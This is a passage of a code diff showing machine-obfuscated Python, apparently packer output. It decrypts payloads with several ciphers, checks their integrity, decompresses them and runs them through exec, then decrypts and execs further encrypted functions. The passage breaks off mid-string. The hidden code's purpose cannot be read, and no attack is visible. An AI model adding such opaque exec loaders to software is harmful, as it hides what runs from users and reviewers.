+        _rimktbd = _dpweyflet.new(_aackahai, _wwgwruiwx, digestmod='sha256').digest()
+        if not _dpweyflet.compare_digest(_wnhydog, _rimktbd):
+            _kzmuxh.stderr.write("error: integrity check failed\n"); _kzmuxh.exit(1)
+        _ippspzu = _zqlvo[0]
+        _hejxfn = bytearray()
+        for _btiag in range(len(_wwgwruiwx)):
+            _xdgbgv = _wwgwruiwx[_btiag] ^ _ippspzu
+            _hejxfn.append(_xdgbgv)
+            _ippspzu = _wwgwruiwx[_btiag] ^ _zqlvo[ (_btiag + 1) % len(_zqlvo) ]
+            _ippspzu = (((_ippspzu << 3) & 0xFF) | (_ippspzu >> 5)) ^ 0x5A
+        _hejxfn = bytes(_hejxfn)
+    elif _vqkbcm == 5:
+        _xdgbgv = _zoicqg[:16]; _wnhydog = _zoicqg[-32:]; _wwgwruiwx = _zoicqg[16:-32]
+        _ryptlntrv = _ooyjwkgp.pbkdf2_hmac('sha256', _ozpavmjdc.encode(), _xdgbgv, 100000, dklen=64)
+        _zqlvo = _ryptlntrv[:32]; _aackahai = _ryptlntrv[32:64]
+        _rimktbd = _dpweyflet.new(_aackahai, _wwgwruiwx, digestmod='sha256').digest()
+        if not _dpweyflet.compare_digest(_wnhydog, _rimktbd):
+            _kzmuxh.stderr.write("error: integrity check failed\n"); _kzmuxh.exit(1)
+        _hejxfn = bytes(_wwgwruiwx[i] ^ _zqlvo[i % 32] for i in range(len(_wwgwruiwx)))
+    elif _vqkbcm == 6:
+        _hejxfn = _nekcm.b64decode(_zoicqg)
+    elif _vqkbcm == 0:
+        _xdgbgv = _zoicqg[:16]; _wnhydog = _zoicqg[-32:]; _wwgwruiwx = _zoicqg[16:-32]
+        _ryptlntrv = _ooyjwkgp.pbkdf2_hmac('sha256', _ozpavmjdc.encode(), _xdgbgv, 100000, dklen=64)
+        _zqlvo = _ryptlntrv[:32]; _aackahai = _ryptlntrv[32:64]
+        _rimktbd = _dpweyflet.new(_aackahai, _wwgwruiwx, digestmod='sha256').digest()
+        if not _dpweyflet.compare_digest(_wnhydog, _rimktbd):
+            _kzmuxh.stderr.write("error: integrity check failed\n"); _kzmuxh.exit(1)
+        _xzlpmi = _mdpjc(_zrldyp.AES(_zqlvo), _xxelftcz.ECB())
+        _hejxfn = _xzlpmi.decryptor()
+        _hejxfn = _hejxfn.update(_wwgwruiwx) + _hejxfn.finalize()
+        _ippspzu = _hejxfn[-1]
+        if _ippspzu < 1 or _ippspzu > 16 or not all(_ == _ippspzu for _ in _hejxfn[-_ippspzu:]):
+            _kzmuxh.stderr.write("error: decryption failed\n"); _kzmuxh.exit(1)
+        _hejxfn = _hejxfn[:-_ippspzu]
+    elif _vqkbcm == 2:
+        _xdgbgv = _zoicqg[:16]; _wnhydog = _zoicqg[-32:]; _wwgwruiwx = _zoicqg[16:-32]
+        _ryptlntrv = _ooyjwkgp.pbkdf2_hmac('sha256', _ozpavmjdc.encode(), _xdgbgv, 100000, dklen=80)
+        _zqlvo = _ryptlntrv[:32]; _tfpbc = _ryptlntrv[32:48]; _aackahai = _ryptlntrv[48:80]
+        _rimktbd = _dpweyflet.new(_aackahai, _wwgwruiwx, digestmod='sha256').digest()
+        if not _dpweyflet.compare_digest(_wnhydog, _rimktbd):
+            _kzmuxh.stderr.write("error: integrity check failed\n"); _kzmuxh.exit(1)
+        _xzlpmi = _mdpjc(_zrldyp.AES(_zqlvo), _xxelftcz.CTR(_tfpbc))
+        _hejxfn = _xzlpmi.decryptor().update(_wwgwruiwx)
+    elif _vqkbcm == 10:
+        _hejxfn = bytes.fromhex(_zoicqg.decode('ascii'))
+    elif _vqkbcm == 3:
+        from cryptography.hazmat.primitives.ciphers.aead import AESGCM as _wlhlx
+        _xdgbgv = _zoicqg[:16]; _wnhydog = _zoicqg[-32:]; _hejxfn = _zoicqg[16:-32]
+        _wwgwruiwx = _hejxfn[:-16]; _ippspzu = _hejxfn[-16:]
+        _ryptlntrv = _ooyjwkgp.pbkdf2_hmac('sha256', _ozpavmjdc.encode(), _xdgbgv, 100000, dklen=76)
+        _zqlvo = _ryptlntrv[:32]; _tfpbc = _ryptlntrv[32:44]; _aackahai = _ryptlntrv[44:76]
+        _rimktbd = _dpweyflet.new(_aackahai, _hejxfn, digestmod='sha256').digest()
+        if not _dpweyflet.compare_digest(_wnhydog, _rimktbd):
+            _kzmuxh.stderr.write("error: integrity check failed\n"); _kzmuxh.exit(1)
+        _hejxfn = _wlhlx(_zqlvo).decrypt(_tfpbc, _wwgwruiwx + _ippspzu, None)
+    elif _vqkbcm == 9:
+        def _hegoaufh(_zqexnvx):
+            if _zqexnvx[:2] == b'<~': _zqexnvx = _zqexnvx[2:]
+            if _zqexnvx[-2:] == b'~>': _zqexnvx = _zqexnvx[:-2]
+            _skcrod = bytearray(); _mqjgzd = 0
+            while _mqjgzd < len(_zqexnvx):
+                if _zqexnvx[_mqjgzd] == 122:
+                    _skcrod.extend(b'\x00\x00\x00\x00'); _mqjgzd += 1; continue
+                _hjpvlj = 0; _vebllya = 0
+                while _mqjgzd < len(_zqexnvx) and _vebllya < 5:
+                    _hjpvlj = _hjpvlj * 85 + (_zqexnvx[_mqjgzd] - 33); _mqjgzd += 1; _vebllya += 1
+                _vzaheswhv = _vebllya - 1
+                if _vzaheswhv > 0: _skcrod.extend(_hjpvlj.to_bytes(4, 'big')[4-_vzaheswhv:])
+            return bytes(_skcrod)
+        _hejxfn = _hegoaufh(_zoicqg)
     else:
-        _jwfcgd.stderr.write("error: unsupported algorithm\n"); _jwfcgd.exit(1)
-    _vk = bytes.fromhex("6f3fb079f1971799500c54b60ac47af2b7d3af930d6fc0a3a1abd9e9e92f69b3")
-    _vn = bytes.fromhex("8d45f3c0c991f69d426624a9eacd01d5")
-    _sig = _wrelk[-32:]
-    _pl = _wrelk[4:-32]
+        _kzmuxh.stderr.write("error: unsupported algorithm\n"); _kzmuxh.exit(1)
+    _vk = bytes.fromhex("29cc200cb9e4ce40f32507a0f203e7aadec12407cd8c61baac095c77bf84c4cb")
+    _vn = bytes.fromhex("5678ab2e2c3a06e319f706e4dc0c927f")
+    _sig = _hejxfn[-32:]
+    _pl = _hejxfn[4:-32]
     import hmac, hashlib
     if not hmac.compare_digest(_sig, hmac.new(_vk, _pl, hashlib.sha256).digest()):
-        _jwfcgd.stderr.write('error: VM integrity check failed\n'); _jwfcgd.exit(1)
+        _kzmuxh.stderr.write('error: VM integrity check failed\n'); _kzmuxh.exit(1)
     _pd = bytes([_pl[i] ^ _vk[i % 32] ^ _vn[i % 16] for i in range(len(_pl))])
-    if _wrelk[1] == 1:
-        import zlib as _dolhi
-        _pd = _dolhi.decompress(_pd)
-    elif _wrelk[1] == 2:
-        import lzma as _dolhi
-        _pd = _dolhi.decompress(_pd)
-    elif _wrelk[1] == 3:
-        import bz2 as _dolhi
-        _pd = _dolhi.decompress(_pd)
-    elif _wrelk[1] == 4:
-        import brotli as _dolhi
-        _pd = _dolhi.decompress(_pd)
-    elif _wrelk[1] == 5:
-        import zstandard as _dolhi
-        _pd = _dolhi.decompress(_pd)
-    elif _wrelk[1] == 6:
-        import gzip as _dolhi
-        _pd = _dolhi.decompress(_pd)
-    elif _wrelk[1] == 7:
-        import lz4.frame as _dolhi
-        _pd = _dolhi.decompress(_pd)
-    elif _wrelk[1] == 8:
-        import snappy as _dolhi
-        _pd = _dolhi.decompress(_pd)
-    elif _wrelk[1] == 9:
-        import gzip as _dolhi
-        _pd = _dolhi.decompress(_pd)
-    elif _wrelk[1] == 10:
-        import blosc as _dolhi
-        _pd = _dolhi.decompress(_pd)
+    if _hejxfn[1] == 1:
+        import zlib as _ofumrabw
+        _pd = _ofumrabw.decompress(_pd)
+    elif _hejxfn[1] == 2:
+        import lzma as _ofumrabw
+        _pd = _ofumrabw.decompress(_pd)
+    elif _hejxfn[1] == 3:
+        import bz2 as _ofumrabw
+        _pd = _ofumrabw.decompress(_pd)
+    elif _hejxfn[1] == 4:
+        import brotli as _ofumrabw
+        _pd = _ofumrabw.decompress(_pd)
+    elif _hejxfn[1] == 5:
+        import zstandard as _ofumrabw
+        _pd = _ofumrabw.decompress(_pd)
+    elif _hejxfn[1] == 6:
+        import gzip as _ofumrabw
+        _pd = _ofumrabw.decompress(_pd)
+    elif _hejxfn[1] == 7:
+        import lz4.frame as _ofumrabw
+        _pd = _ofumrabw.decompress(_pd)
+    elif _hejxfn[1] == 8:
+        import snappy as _ofumrabw
+        _pd = _ofumrabw.decompress(_pd)
+    elif _hejxfn[1] == 9:
+        import gzip as _ofumrabw
+        _pd = _ofumrabw.decompress(_pd)
+    elif _hejxfn[1] == 10:
+        import blosc as _ofumrabw
+        _pd = _ofumrabw.decompress(_pd)
     else:
         pass
-    _c, _k, _m, _map, _ok = _vm_deserialize(_pd)
-    exec(compile(_uxujbpzjd.b64decode("aW1wb3J0IGJhc2U2NAppbXBvcnQgaGFzaGxpYgppbXBvcnQgaG1hYwppbXBvcnQgY3R5cGVzCmltcG9ydCBiYXNlNjQKaW1wb3J0IGhhc2hsaWIKaW1wb3J0IGhtYWMKaW1wb3J0IGN0eXBlcwpfRlVOQ19LRVkgPSBiYXNlNjQuYjY0ZGVjb2RlKCcvNDB6NlBuVndycDQ3cmI5Zk5PUmJTbndmeGdSekFLdmlJc3owcHdFVi9zPScpCl9GRU5DX0RBVEEgPSBbYmFzZTY0LmI2NGRlY29kZSgnYUJVd1ZjNTdjSnBKcHJmRzlBUlpZKzJKNnN6WFVFL0JtVjZWU0NqNVhqTjIzc0NDeDh2bkhiZUlDbmhJS2FTTHhkelR5RFlhQlF2bEN0UkYrc2pzYW9YczlHUm5XcUVUVHo2OUlEMHpvVEhKM3QveUk4bEc3UGxYZnEreVN3TUp6SlM2ZlFmRHBCSi9KYWt4UXlIQ1MrNXJQRVFuTTJpTkxhWEFMZFZPNm9walk3VmJoc2NNMVdkUWowMXpuK1gzRFdjVDlTeGtQV1crd3RDK1lRL3FJK0N3UzAyL044cHdLQlRNK2U1ek9JQVVFYStlYlZaYnI3TjZ4Q0JEbkdQeHZZRWkrN1Y5QWpodE1OS1JadzdrUHB0M3Q4RHE0QXQvOVRGc3ZCSVNKcHp6eVdBVjViSlI3T0FTL0dCbTZvbnVwSVdaOWNqQk9tazMvN01GUTN5ZjJ1TlJ0WG92eGVESSt6RHZRbitINXNpZDdFL1piZXR2SDRsbGlldWlSdCtNL3FVdm9DdnJwMzRVYVBRbFdHOFpEYUxyS3RyN3hQZVl1aGRrZFBCRCs5SXFqWnVMMWtqRlRaNFVDWjZITVVzRXlQT3pTVHFielBzSWE3V29EUVU0SGRhL2JFTnQyc0RzS2dWT1NwL0tKdVU0SGJhNGZQNFRSQTdhZDRIamRzR2NlNmVta2RqR3paYkRFWUdzYVZuNEZ0NE55VGIvK01nRHk0clYxLzZNM2Irai8wcHRvRHYwMWN1UHloZXdBalhMbHBuQzNiMmVJcXoxaUN0R2lvckdBdFI1b0hmbzNFY3hua2MySjBsQnR1dmdrNWNBN09YeTBvdDZZUTF4bkp2OVk4a2JvMlpMaHcwVmNYMmZob3h0bkpJVUpScFI1WDFiTE12WGN1WmNKWHlRNlUyZ3RkQWJlc25HRUZQQkdjOHBjeEl1UTlTR3UvVzQyNTdVVmtwekhPRThEUFdmNkRiR1Y0aVl0OXdQaTN4NzJoNzhKcTI4OGpqaUk2UjlaUFFIUFNZRU9DenpPejlvRDdGY2dPMHpaUkR3Zng1RkF1SkJxck9FYVNNM3JueGpob1dxQXJnR1dkOE1iY0hkNHpXMlVMMGN5bFo5ekNSVFZpdTJTWm1rNTJxVHJMUUVnTldLUDY3aE5MSDdtYVU4U0hiVDlQckwyQnB2aUVGbEowS0VDaVQyUFlFNXVGL0J0MVU3Yko3UVdwNWZZWTRqak9PaWs4V1k2eC9ab2xjTGFVYUVKdnVwY0h3THR1T2c1VStJbEZsT0pxTTlhUTFCQ0x3Um5TSHhQRFYrZno3YVB2YXAyL1NJUzZSTk9OcS80T1NkbmZGb1RmZElWdU1DT1UyRklqU0dzT2Vxc3FBNnRTdHJxQkVWOEMwVW1pQ3lvNVdNTlBEYWdqSkt0YXNHR3dYRHJaVjlSdmhxRUk5YzBnSXJIT09ZVDRmM0IxbGFBNEsza05XMDdEQ1VsVDV1YlFhK09CVkhTUnVtbk9RT1E4Mlc3clg1VldWQkV5a1JGMzFrWkZWdU5BZHB1WDhZVjdDVm9IRTZLVXU5ek9iWkUyVmp2YjZYQ0dhKzNWeDdKdmhweHo3RHFheC9UcWxGR2MvNW83QXFyZWU0dFN0a1loUmpDSDd0Qk5MNDU5cXc1Mnc4NjE0VlJsdW15SnA0bVhIVys4T29wNkVWSWhDM1dQbi9YRytieHhTWEt2ZzRYQ0Myd3orTW4rZ0xZbWx0SnEwdXBpZ0Z4VWVyeW1nc2ZLRVVpdWNBNmo1UDlaYUtLS2IzYTRTbFNZaXdyejNoa3cyMVYzZ3N2Vngwc1RxL2drUmpqNWlTTGNsSGtmRHRZR0I0M2NqUmhNSnJWd0pOc01vb3N2V3BQVThJVWF0a0lxUVlSS1ZPQlRhSEtma1IxZkc5S1A4Y2pxMmN2UUpvVVZjMHJlTGZ4ZlNiTXBMRFgzQXhZSWcvRUU5SHZwMGY0eVF1T1lZY3piOFY1WWVib1UyTHEvbU93dmdUdU9nYXZia2RYUHl2WnN6UjJjUUJHdXRYM0k5TENRbW9nR3EvOEw1YVFpaVRjdTVUTit4L0c5c1NtMjZlSk1BeG9lWms3MWV5N1V0TzBNQllab2dsWStqV0FiRzRwTnpQTmlEdEhoQU5ENGdQblFoMDk2MThRSk9tL0JmNnJ5TWR5QjFQM1d3b3hTbWtwS2pGdzkxdTJmZkNjZXBkUWVaOVpyRHNvTG9wOHI2Q2RmUENNb0NvTmc9PScpLCBiYXNlNjQuYjY0ZGVjb2RlKCdURi9iaFZ6dk1vNUpzbnFhazdkem5mUHNpOG1mMFVGVi9FRzBuUk1TZ1AxcnNNb3NQOE4wcFJJZTZhZU9wczB6eU8waGxhSlA5YVR5TnpHaWVHc1FYVTMyYmpSSk5CSHR1alorMjIxV2V1QXBlZ2tOb1BFZk5GRmR5NzRDQU5FWDZqdzhoMUl4VkQwUFB4dk5hNWlyZlhodXRuSzBuc3N1NGJUN0xnekRYeG9xS3pwaXVmRWg0T2d6WU5YSmljYmw3KzNGSjdKTkxSQ0hUNzhtNkVVanZHdTBJNFNTZTNYdzhQUVNXYnFINWdvY296R21HMDFoTmRRVlNuWC8xMFdNbHcvWVhGdjJZTVd5ZlBnUk5qSFJHMG80RlpSWnRkNUdQVlVieUNXVURYUEMrTGZuMUhtY2ltb0xQRERVRTVsS1NqUFZ4RDFKSFd3S0EyUjBzcWlWSmh2VjVYT25uWEtRL01OZ2hOTFd6cVdhc0NuazA3Q3JXVXpIOFRFWjBRaEcwK1RMTnFwS0lENkVSM2tlNFlIQjlUbWZmRjlQZ0xLVFZ3QStZTmc3UVJmc2hiYTByOHNMRkV3UjlKbVJxd0Y5Y1NDdjFONktnUjlzcHVmbWFrS2tRZGF4R0dGNzhSYXJVRGE0TGZ4a2djTlVyRE1BZzNCa25heXVtLzBQWU1uc3BFK3VUSHo2WGw1b2crOEtRNnFVUDNVMWZIK01MNjJLOHpvSzZtWUc1NDMwUkFxZlVGQVVjVEEwRnRTcWJWQ1J6cWxQVEs5QkZyNzFKc2wvMG4yR3Z3OXRUZFoxcnorU1dpQmgrb1gyTnZNZTVONTRXc2o4SE5naGE5c3dtMHNtSWhueFMrWkhZKzhCVHYzcHl0NUdFWWtCNHE1OEc1TmZiekl3SzF4dEcxYnF4LzFZKzZUelV6dUJUZUJZTHlMUzhTTXBYZkErQzFaUE12T2tGTlZNMHpQTkdRdGFrbSs0UHlnL3BiQ0hoWVdxaTVya0VDNFBlQ3pvUGVvSDdidm9VTURHMnB3SDBjTnFCbGJGN3NJeGxQMnR1ejd1dk9mL3l6d1lvRWN5MHB6VENUM25lRjl2amtlK2EySm44d3FWU2hYRlIyQWtkM0JIMWFFN0FuK1ZtWEJ4ZGlxZ0pueEF3Q3VWbkdpaWZNVU5hUUZUei9xcTNwTnRuTzRteHJQUkJyVnRLb3BtZ1hNNGQ1SEJnQU5EbEU0RTBwc0R3N2hzenpKY0c2ancvc0xvdVJZcHErVElHNVQzbzc5MlZ2STVJZU5YYjdnbmY2VlFzM0ZwWWdHa1BpZzBCdzZmNG5FRUU3MkI1QWs3WDRWT0xyWUdDWmNLa2hkTTBHUDAyazdjYjFpWk51a0xrQjZRRWE0RitYQnNtaThMUUZXbVFqU1B4aEJVSk8yQlRxUHdYdk9PcE9yOEFCSW1TTm9PNEFEWFFGODROSjRFbEZlaEZYUUNESnA1a2hCYTRNRkFSSXRpSWJTQ2Y5bnRBeWZYQXQyQU12bG1OdU13UlJRRExXbFR1V0hBNkJHWU1PbkxQd2RNODN1K0x3MWhxd2xyS3NISm52YjBDWGkvMXlDeUc4NWV1Ui94RjgzNk4rZWFJWTdXNG0rQ0JGZUxYWHJuSklmOGh5NzhqWC9hZVFpZU9Eb21wWGg2Y2JIZ3lZcUErbnNDMXkzMDQ1bWFDSGdOeFhXK2pMNUFBd3ljdW1XZjNUQ1p5SDA0d2ZOTitONlBDWmM5RzVHY2hmREJaVlF2UE9XYkVMejJMSkJ4V205VGhyRXUrOGFXNjRtRHZzZGw1cE43ZGo0QUhiMnBNOEpPMDl4QUYzM2l5SHdwVFZvWElYLzBHK0xOb3NvdG10NjFOayt1SDFqc2RqaVpadWZSUDYvcXRwemtmQ2RlSjNhWWdKY3ZSR01qanRHU3JXaVh2V0Q2QXhVeGI5aHhFa3hsZ0hNSHk0V0pBSkQyR0FBSWhPalQ2K2FWMVlqUWd3YW51ckpPdm81MGo3aGdBZVJjaWhsUFJZU29QTmZZYVJWQTZSOU53OTVhN1cvKzJpMVpJcmxldHh4ZUZTZm5XaEtqTmQzaWZMWk1hUUJYa1M5VTdsbHQvKytzRUtyak9KcytYcUhXSExyb0xRMEZBVnlJVG9CV2xoeWhhVXh4QkNvQlRuWUQ4K09FNUhjUmswcUl1Z0s0Z0tJd3VhU3NVTkJXM21KZVVxdnpXakl2dmtXYlcwQis0NDZyNEhQOWo3UG92OHpBajlOSDI2ZUl0WFhtYjJtcm4rRFltSE0xdzNSako2Tm9IZ0M2clNDbjhsODNGVmR4bG4yY3BkanhuNzkvSDVkc3N3NWtTbW5VT2kyM29WZENVY1dnVTNtZzVMU1RIK1FhSG9xazBXNkx5cFNZejNDK2kzd3Q1MVZLZDQvS28vYjlBZ05Td05KWUU1b2IxbXp4ek1UNW5yZ0k5SFJpanNaNk5NMDNHQlpwQXlxOFNNUWdSQStvRittd1U4emgxOUg0QnR2YnZiNHlJUCtyaFYzaWZ4UGRieUFmVzVDY3ViRjR4bS8wSXdrYTFCenZxRHVmWDJraUlHQ3lHSzRDTWd3ckR1NlFDcUF2R2dlMmNrQVFrTGRxejJkQ1RpMnpaVzNXUjJla2VvRld4SDNsTlk2N0ZGN1pZYWNrQXk3UHZvVWYxUWs1YzlIYldWRXdJMG1wY0dZbVdBZmU3Y0h0NFZxMjROYjhrMlV1RWpIcm83ZlJrRUE5NE43dXdsVTFvWUFVQ1o0TFhHNDdrQ2YvWXJzTTErZzduZ3hRQmJZdjVWUWx6NzdxSUdreXU5cmd3c01xcWVtZnVRTkdncG9PNnpOVldTSytOOE96a2wxOVRaSENBU0FLeWhibGNPTzVZeFkzN25MdHVHZHg2dHp6V25IVWJ1ZnNpdUd4ak4yb1BFQThLYkxKREYycUNJdEJVdllsc2ViVGRseHZNd2dQV2ZyeCtuNVVPcVkwRGZpamhHRGdNdEtvMUIrUndZZWlvdE5pb1BxN1ZOd3hMM3E0TEZxQm9JSytOTFNwOEl0dXFHWVhyTnJCck01NCtvdEtQVFIyenZ6K0hEWTQyR3VNcjFpNlBaSjFxb0pUZlpLdDRiYWJBVE9YN2dHcjhSZGRHTm1yWmcrOVo1TkpuUjdSelJQNycpLCBiYXNlNjQuYjY0ZGVjb2RlKCdIT3ZVYjBPclFVcE1lREhWajJnMU9xMWZldDFuSXNOSHBDOWZTWVlVeFRxc2lSZVJlQjk0N3hMK0NORmtmMHNoRlNYejY4b3hhOHIzTHJoQjlHc05NdEVydkI4NitFMHRiYThJeUtnLzE3NG9PTXVJSUNkMVhlUmVsMy9ERjNuYWhYNVNZdnZ2SVdaOVNVZHhzcHBLaXRYbUo5Sm1sTmdXRHkrZlBJVW5kZmtnY2h4djZic0dMVlRGTDRwMVpuYXUvdVR1dEg4Q3hDV2pGUURyUnB1TXVPZm44ODJFUHlGaDM2THVwRXRKdXZ1NFlyZWpNSUhabDNEREUrODUwSEFFZkpzNGlKY3UwcFYycVcwb05qM3I0NysxSTZVR2IwL25QcTZVWTY1NzZXelduWEpVUUNFdFprckEzWCtxamVTZVYwSU5FbDVNVCtHc2pYWHRGaGFlaG93cXJLTEpyYmEwRW1pbHlZYjRORWdWZFpZQVRrK252VVRQMnQ1T3pOZ3NJTm9LbVp6bkI2dGxtd3lwZmdpckgycEVuTy94bWNsdkFmQm9VY0hGNXlQK3JnaEVHNVlhUTAwZitnaHZaSTBwMmVObnN6Q3BUSnI3K3lHTjUwSmYvSW9EdlNtZU5JekdHL3AvZ1N2VDluMlNvWnI4bnFFOTcyMnBLSGZHNzh0WStUa2x6WFpnZC9FdEtHcHRGZGl0WHloZndxNDg5NG10blNpZCt0SWtpV2VLYjNGZUJ5SG1KUVZZSDhralp2dnFjRU82SmI5REhLK2lMb3o0T1RTYlRHb280YVNWUUJIU3d3NlluTWNEc3QvU3hwWHV3UDNmeW1HMjdNQlpRbGhLT3dadUQyK1dVNmZPQ0JNQTNOeE1uT08xTjE3MDFpVDduVlI1N2tSdUxBZ1VjOVJqb0pkUEgxZHJvS214SjVXLzBTSU0vbk03Ym1lR1U3eUd2ek84d1VVM3g2S2U5V2lXb0l1OFBieGhGZkFKSnlYWm1LYnNKZUYzNHIxdjdJbGovYzliVncvVkl5OUw3Mzh6dzR2UTZ0Nk9aZFJLRENCOG1YMzFRY1NkalZHdmQxeHlyTlU4YWovbnBPY2pRcVVxMnlPL3c5Z2RRY004eDhDT2hKeHVmSDZDM0NXVUY5M05ydU4xWW96WUJFb3B4c1JVYWlUNFFKRzhYZ3NGRG14d2pFdUFzaXFDbTAyZHpSbnk4WUtGNGM1RVF3Z1J4UDRKUWhESEJhMnVUVHNYVG0rUm10Q1BDMGpURWJaemtrYmdVd01KbXhnVUo3b1B5RVhuSk1oSkQzSlFJL0E0NStqa21BZWNxc0NUcXZMcEVNZkx1L1ZxTHZjVWxiNTJaU2drYVlxTXRqSXV1YVJFUEZlazV4RmtXYUNtOTdtbGJpdGVTZ0hMNXBzMTRkQko5MGY2V1pHOEFoRmV4QnFXREFBb0tuZU53K1YyeXVGRjU5MUdBUkw1aWIwelhCY1RpQ3pDKzJZNFNxbVVLMjg3bHBSdS9zdm1zVGZXcFo5c3pMZGpTL2ZPbkhlQzBJN1lkbURvOENkSnBzdG1reENTdDhueHVTaUxFK3NiODF3ZFRVM2E1NFVvdDYzYXBXQ2d4NHBMbVNHTy8xbEFzMjJaUVVoaVJDYk1XUno4S25CTkNZSDRJbkMvTXAwOGV2R0NlME1vQ2lMS3R6Nk01NVd6NTVVM0dSaTZZRUZqaEVFRDdyQkRCR2sxRmgxN3h0bWxHeitWSUVINVBDVTh3SVEwU2JsRG5NeDE4MnJxYUdVNmlKNHlTNHBEMUhLZmxoOVk5a2Z5ell0UnZDMXduZ016ZHdsMEQzK2ZoS1luYTlzTnlsZWduZ0VjaDhkQ2lkRStud2cxSTcvZ1FSNUc3OEdId1ZGZjU4bTJneVMzaSs1aHNWWjJFVHEwK0JYRTBjSE1KdWVwRlBPMHVpUG9pQ0VyQ3pSZ1dMVHdteThlbHBwKzc4VGExSXNUQjBnUnBlUk9ZODF2SmNxL2tuSXRUTGJtR1c1MGw3ZzRuUlEyajhNMUY4azlMV3ZGaVVFSXl5K3ZRSFZzZ29hTk11aytUZWtEZGxCYzRuV1dsbjk5bDJaT0lUdExYd3QrWE50dVQ2SGZ2VThvS25JZThja21TOWI5eWQwZkREdm5YRER5alJSaGxjL3Z0ODR4cUdhS2tqTWd0ZTBuWE0rYkpjZmpJZGRwKzBXNTgwSFFiZXBYMXl0akk5UGV4a0NEZ1MvYk9FZE9FRlVKTkVHdzhmTlhGbFJudURKMFBJQjg1bTRCNGRhSnVxYXkyaEhiVHZ1VktIV0FaWXJGMnBrNTdkR0dWK1hDekdLRUp4UWtyZTg5S0VJZGZ6VkF5Wjhmb3E0VmxydDV6YmhyeXNiN1JVUjJPcDlobWRIWFkzL2o5VEhOM3RaYjRKYSt0d2I0SDFqbFZEaWN3MFk5bFNOMmV1YWxRR3FtenRCVHVXNTF4SSt0aUdPcVhPeEdNRXNKckVvOTJMaFp2YTZCOXlFSm1UOWttVzI2eFRDeUpycG9Zc2gxN2t4U1hmS2tPVUNKUVRwRlJhVWlNSGxOeVd2c1R2NEtMeDZMY1Q4NWFmazJBOS83QlJVK1Z2SVU1V1Vob3pDby9PekNYOFRyUElvdmpNSHpjMWZSRlZUMUpzYWVweVhhYVM4S0I1bGp3UGdpT1V2SmtobEcvaTByUU13SHVtWWRJbTMrbk5DL1BqdUp6dXl3WVdTQmVXVjJ4K0l6Q0pEVExsMkJaYTdIaFN2RlBEWlh4QkNhcFZXV081K3YwUnpNOTNIREwvZkhMVDFvemkwcmhKTS9iYkRLTWg5ZnRLWHJuQjFUcG5WWjRLTnNnZVpmL3hWZFRIa1lCNUtDcWhnb1JDRm5FSldCY1g4QUoyUnE1RERDTG41bThudUcwKzdPK2pNckczaFUzUXcvaHBXMmU1akhWcTJGTmdJSmtzeElDRUcvRGJIeXNxY05Qd2NadHZXaVJBN0svRE51bTRWd0UxSVFhWTJGWVNWME13cmhBM1pCUXdrNGVZeFZ3UUJJTHFId29jWEVTVlVpTVM3VVFIVDcwKzROWnlRbTU2SUNCTXlzaHVpYjN4RElmMUZnbVRibWRQMWxRK2NPcFZnd0ZEOHo0R3ZydUt0dFZVdWJSRDJkV0hpd09SOEdtNVBKU3NldFBRQTFZYW1HWk5OOS9NUUZCRzlsaXFVbGpFcExkWGgwa3BqWkkvNkhFR1pCVVIwaWV6SnNFeHhOV2FuZ2w1bXphQkx6ODNpcVduUDYrN0xaY29yL0hObVo3L251S0JFRnFqU0FvdHRyRTBHSXptdWtKZTFpQmx3KzBYR1VRVFY2cDNRZlpIZDZ1dDVCaWtEcGlmbmNJOVRRU29uNDlCMmZITUNtL1V5b0ZTbSs0QjB2ak00L2R4T1RWcUt4Z1k0Q09wZ2oxTDBtTVlDSFNTdEVSYzQySTJQYzJhYUMrQWdYRG5BOXRheUViQlF3djZaTmpQS0JyWENDQnJVVjFzcUNrQklFMjBBRXVRT0VjNUUvU0dTbEcrZDNzV1lxTTNMbVpqdGhJeEZOTkFGRm1MMUlIZjFMejNoK2Q1TCtGR0VERmFWS21sVGF0NzhTeTZxT1drWklBY20xQU9IMlppZnl5SE9yWGgwZUI1WXc2eUlkZ01udlN3aHg2Yk56U1E5aTMrTkVvL0ZaV2ZzcjFTUEE0cUFkdk9xT3VxZGhUajlnNXIwbkFMcEZvRHFZU3lSZ0xVWHJMckp0anpKcTBaaEp4Yzh1M0l1YnF3UUJ4SnJpUXFVT3NRUm10dEM5eGZCTU41RE9jWG89JyldCl9GVU5DX0NBQ0hFID0ge30KCmRlZiBfZXhlY19lbmMoaWR4LCBrZXksIG5hbWUsIGFyZ3MsIGt3YXJncyk6CiAgICBpZiBuYW1lIGluIF9GVU5DX0NBQ0hFOgogICAgICAgIHJldHVybiBfRlVOQ19DQUNIRVtuYW1lXSgqYXJncywgKiprd2FyZ3MpCiAgICByYXcgPSBfRkVOQ19EQVRBW2lkeF0KICAgIG5vbmNlLCB0YWcgPSAocmF3WzoxNl0sIHJhd1stMTY6XSkKICAgIGN0ID0gcmF3WzE2Oi0xNl0KICAgIGF1dGhfa2V5ID0gaGFzaGxpYi5zaGEyNTYoYidhdXRodjE6JyArIGtleSArIG5vbmNlKS5kaWdlc3QoKQogICAgaWYgbm90IGhtYWMuY29tcGFyZV9kaWdlc3QoaGFzaGxpYi5zaGEyNTYoYXV0aF9rZXkgKyBjdCkuZGlnZXN0KClbOjE2XSwgdGFnKToKICAgICAgICByYWlzZSBSdW50aW1lRXJyb3IoJ1tmdW5jZW5jXSBpbnRlZ3JpdHkgY2hlY2sgZmFpbGVkJykKICAgIGVuY19rZXkgPSBoYXNobGliLnNoYTI1NihiJ2VuY3YxOicgKyBrZXkgKyBub25jZSkuZGlnZXN0KCkKICAgIHBsYWluX2J5dGVzID0gX3hvcl9zdHJlYW0oZW5jX2tleSwgY3QpCiAgICBwbGFpbl9zdHIgPSBwbGFpbl9ieXRlcy5kZWNvZGUoJ3V0Zi04JykKICAgIG5zID0ge30KICAgIGV4ZWMocGxhaW5fc3RyLCBnbG9iYWxzKCksIG5zKQogICAgZnVuYyA9IG5zWydfZiddCiAgICBfRlVOQ19DQUNIRVtuYW1lXSA9IGZ1bmMKICAgIHJlc3VsdCA9IGZ1bmMoKmFyZ3MsICoqa3dhcmdzKQogICAgcmV0dXJuIHJlc3VsdAoKYXN5bmMgZGVmIF9leGVjX2VuY19hc3luYyhpZHgsIGtleSwgbmFtZSwgYXJncywga3dhcmdzKToKICAgIGlmIG5hbWUgaW4gX0ZVTkNfQ0FDSEU6CiAgICAgICAgcmV0dXJuIGF3YWl0IF9GVU5DX0NBQ0hFW25hbWVdKCphcmdzLCAqKmt3YXJncykKICAgIHJhdyA9IF9GRU5DX0RBVEFbaWR4XQogICAgbm9uY2UsIHRhZyA9IChyYXdbOjE2XSwgcmF3Wy0xNjpdK